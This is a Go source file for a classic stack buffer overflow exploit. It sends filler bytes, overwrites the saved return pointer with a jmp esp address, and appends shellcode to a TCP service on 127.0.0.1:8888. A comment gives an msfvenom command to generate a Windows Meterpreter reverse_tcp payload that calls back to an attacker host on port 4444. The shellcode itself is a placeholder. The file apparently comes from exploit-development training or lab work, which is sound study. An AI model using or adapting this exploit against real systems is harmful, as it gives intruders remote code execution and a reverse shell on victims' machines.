package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strings"
)

func main() {
	// Connect to server
	conn, err := net.Dial("tcp", "127.0.0.1:8888")
	if err != nil {
		fmt.Println("Failed to connect", err.Error())
		os.Exit(1)
	}
	defer conn.Close()

	// msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f py -b "\x00\x0a\x0d" -v shellcode
	shellcode := ""
	shellcode += "\xCC\xCC\xCC\xCC\xCC" // Remove this line, it's here just to show you the go syntax

	// Craft malicious message
	offset := 1052
	PAYLOAD_SIZE := offset + 1024

	// SRP
	ptrJmpEsp := make([]byte, 4)
	binary.LittleEndian.PutUint32(ptrJmpEsp, 0x68A842B5)

	// Protect potential stack damage caused by encoded payload
	subEsp10 := "\x83\xec\x10"

	buf := ""
	buf += strings.Repeat("\x41", offset)                    // filler
	buf += string(ptrJmpEsp)                                 // SRP overwrite
	buf += subEsp10 + shellcode                              // ESP excpected here
	buf += strings.Repeat("\x44", (PAYLOAD_SIZE - len(buf))) // trailing padding

	// Send message
	fmt.Println("Sending buffer")
	reply := make([]byte, 1024)

	conn.Write([]byte(buf))
	conn.Read(reply)

	fmt.Println("Done")
	os.Exit(0)
}
